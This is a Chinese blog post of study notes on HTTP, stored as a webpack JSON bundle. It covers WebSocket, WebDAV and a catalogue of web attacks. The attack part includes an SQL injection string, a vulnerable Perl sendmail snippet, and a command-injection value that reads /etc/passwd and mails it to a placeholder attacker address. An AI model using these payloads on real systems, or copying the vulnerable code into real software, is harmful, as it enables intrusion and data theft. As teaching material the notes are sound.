(window.webpackJsonp=window.webpackJsonp||[]).push([[166],{648:function(n){n.exports=JSON.parse('{"content":"<p>HTTP的瓶颈</p>\\n<ul>\\n<li>一条连接上只可发送一个请求。</li>\\n<li>请求只能从客户端开始。客户端不可以接收除响应以外的指令。</li>\\n<li>请求 / 响应首部未经压缩就发送。首部信息越多延迟越大。</li>\\n<li>发送冗长的首部。每次互相发送相同的首部造成的浪费较多。</li>\\n<li>可任意选择数据压缩格式。非强制压缩发送。</li>\\n</ul>\\n<p>解决方法：</p>\\n<ol>\\n<li>Ajax (局部更新)</li>\\n<li>Comet (延迟响应，请求了挂起，等有更新再响应)</li>\\n</ol>\\n<hr>\\n<p>WebSocket</p>\\n<ul>\\n<li><p>推送功能：服务器推送给客户端</p>\\n</li>\\n<li><p>减少通信量</p>\\n<ol>\\n<li>保持连接状态</li>\\n<li>握手请求：<ul>\\n<li>请求头字段<code>Upgrade: websocket</code></li>\\n<li>请求头字段<code>Sec-WebSocket-Key</code>：握手过程中必不可少的键值</li>\\n</ul>\\n</li>\\n<li>握手响应：<ul>\\n<li>响应状态码<code>101 Switching Protocols</code></li>\\n<li>响应字段<code>Sec-WebSocket-Accept</code>：根据<code>Sec-WebSocket-Key</code>生成</li>\\n</ul>\\n</li>\\n</ol>\\n</li>\\n</ul>\\n<hr>\\n<p>Web 服务器管理文件的 WebDAV</p>\\n<p>是一个可对 Web 服务器上的内容直接进行文件复制、编辑等操作的分布式文件系统</p>\\n<p>一些概念</p>\\n<ul>\\n<li>集合（Collection）：是一种统一管理多个资源的概念。以集合为单位可进行各种操作。也可实现类似集合的集合这样的叠加。</li>\\n<li>资源（Resource）：把文件或集合称为资源。</li>\\n<li>属性（Property）：定义资源的属性。定义以“名称 = 值”的格式执行。</li>\\n<li>锁（Lock）：把文件设置成无法编辑状态。多人同时编辑时，可防止在同一时间进行内容写入。</li>\\n</ul>\\n<hr>\\n<p>WebDAV 为实现远程文件管理，向 HTTP/1.1 中追加了以下这些方法</p>\\n<ul>\\n<li>PROPFIND ：获取属性</li>\\n<li>PROPPATCH ：修改属性</li>\\n<li>MKCOL ：创建集合</li>\\n<li>COPY ：复制资源及属性</li>\\n<li>MOVE ：移动资源</li>\\n<li>LOCK ：资源加锁</li>\\n<li>UNLOCK ：资源解锁</li>\\n</ul>\\n<p>为配合扩展的方法，状态码也随之扩展。</p>\\n<ul>\\n<li>102 Processing ：可正常处理请求，但目前是处理中状态</li>\\n<li>207 Multi-Status ：存在多种状态</li>\\n<li>422 Unprocessible Entity ：格式正确，内容有误</li>\\n<li>423 Locked ：资源已被加锁</li>\\n<li>424 Failed Dependency ：处理与某请求关联的请求失败，因此不再维持依赖关系</li>\\n<li>507 Insufficient Storage ：保存空间不足</li>\\n</ul>\\n<hr>\\n<ul>\\n<li><p>XSS攻击</p>\\n</li>\\n<li><p>SQL注入攻击</p>\\n<p>   例子：</p>\\n<p>   URL 的查询字段已指定 <code>xxx.com/?q= 上野宣</code>，这个值由 Web 应用传入到SQL 语句中，构成下方的 SQL 语句。</p>\\n<p>   <code>SELECT * FROM bookTbl WHERE author = &#39;上野宣&#39; and flag = 1;</code></p>\\n<p>   注入：</p>\\n<p>   查询字段的<code>上野宣</code>改写成<code>上野宣&#39;--</code>，执行以下SQL(<code>--</code>表示之后是注释)</p>\\n<p>   <code>SELECT * FROM bookTbl WHERE author =&#39;上野宣&#39; --&#39; and flag=1;</code></p>\\n<ul>\\n<li><p>OS 注入攻击</p>\\n<p>一段咨询表单代码，会获取用户填写的邮箱，自动发送一封邮件。</p>\\n<pre><code><pre class=\\"hljs\\"><code>my $adr = $q-&gt;param(\'mailaddress\');\\nopen(MAIL, &quot;| /usr/sbin/sendmail $adr&quot;);\\nprint MAIL &quot;From: info@example.com\\\\n&quot;;</code></pre></code></pre><p>攻击者将下面的值指定作为邮件地址</p>\\n<p><code>; cat /etc/passwd | mail hack@example.jp</code></p>\\n<p>攻击者的输入值中含有分号<code>;</code>。这个符号在 OS 命令中，会被解析为分隔多个执行命令的标记</p>\\n</li>\\n</ul>\\n</li>\\n<li><p>HTTP 首部注入攻击</p>\\n<p>  有些响应会将请求的一部分作为响应首部字段值。</p>\\n<p>  HTTP 首部注入攻击（HTTP Header Injection）是指攻击者通过在响应首部字段内插入换行<code>%0D%0A</code>，添加任意响应首部或主体的一种攻击</p>\\n<p>  HTTP 首部注入攻击有可能会造成以下一些影响。</p>\\n<ul>\\n<li>设置任何 Cookie 信息</li>\\n<li>重定向至任意 URL</li>\\n<li>显示任意的主体（HTTP 响应截断攻击）</li>\\n</ul>\\n</li>\\n<li><p>HTTP 响应截断攻击</p>\\n<p>  插入2个换行<code>%0D%0A%0D%0A</code>，伪造成响应主体。</p>\\n</li>\\n<li><p>开放重定向</p>\\n<p>  重定向参数写在<code>URL</code>上，容易被篡改</p>\\n<p>  <code>http://example.com/?redirect=http://hackr.jp</code></p>\\n</li>\\n<li><p>会话劫持( 盗取<code>sid</code>)</p>\\n<ul>\\n<li>通过非正规的生成方法推测会话 ID</li>\\n<li>通过窃听或 XSS 攻击盗取会话 ID</li>\\n<li>通过会话固定攻击（Session Fixation）强行获取会话 ID</li>\\n</ul>\\n</li>\\n<li><p>跨站点请求伪造(CSRF)</p>\\n<p>  可能造成的危害：</p>\\n<ul>\\n<li><p>利用已通过认证的用户权限更新设定信息等</p>\\n</li>\\n<li><p>利用已通过认证的用户权限购买商品</p>\\n</li>\\n<li><p>利用已通过认证的用户权限在留言板上发表言论</p>\\n<p>例子：</p>\\n<p>留言板评论<code>&lt;img src=&quot;恶意代码&quot; /&gt;</code></p>\\n<p>其他用户访问，执行恶意代码，被获取<code>cookie</code></p>\\n</li>\\n</ul>\\n</li>\\n</ul>\\n<hr>\\n<p>通过网络进行密码试错</p>\\n<ul>\\n<li><p>穷举法</p>\\n</li>\\n<li><p>字典攻击</p>\\n</li>\\n<li><p>彩虹表</p>\\n<p>  <code>Rainbow Table</code>是由明文密码及与之对应的散列值构成的一张数据库表</p>\\n</li>\\n<li><p>点击劫持(UI伪装)</p>\\n</li>\\n<li><p>DoS 攻击</p>\\n<p>  主要有以下两种 DoS 攻击方式。</p>\\n<ul>\\n<li><p>集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈停止状态。</p>\\n</li>\\n<li><p>通过攻击安全漏洞使服务停止。</p>\\n<p>多台计算机发起的 DoS 攻击称为 DDoS 攻击</p>\\n</li>\\n</ul>\\n</li>\\n</ul>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-29","timeArr":[2018,10,29,0,0,0,0],"title":"图解Http大纲笔记(3)","uuid":"b0662d8a00fca2a154662ad07955d8c807636c91","summary":"<p>HTTP的瓶颈</p>\\n<ul>\\n<li>一条连接上只可发送一个请求。</li>\\n<li>请求只能从客户端开始。客户端不可以接收除响应以外的指令。</li>\\n<li>请求 / 响应首部未经压缩就发送。首部信息越多延迟越大。</li>\\n<li>发送冗长的首部。每次互相发送相同的首部造成的浪费较多。</li>\\n<li>可任意选择数据压缩格式。非强制压缩发送。</li>\\n</ul>\\n<p>解决方法：</p>\\n<ol>\\n<li>Ajax (局部...</li>\\n</ol>","slug":"tu-jie-Http-da-gang-bi-ji-(3)","sha":"fe5b6414904c9b660ed09bb3304c04df11fe2d88"}')}}]);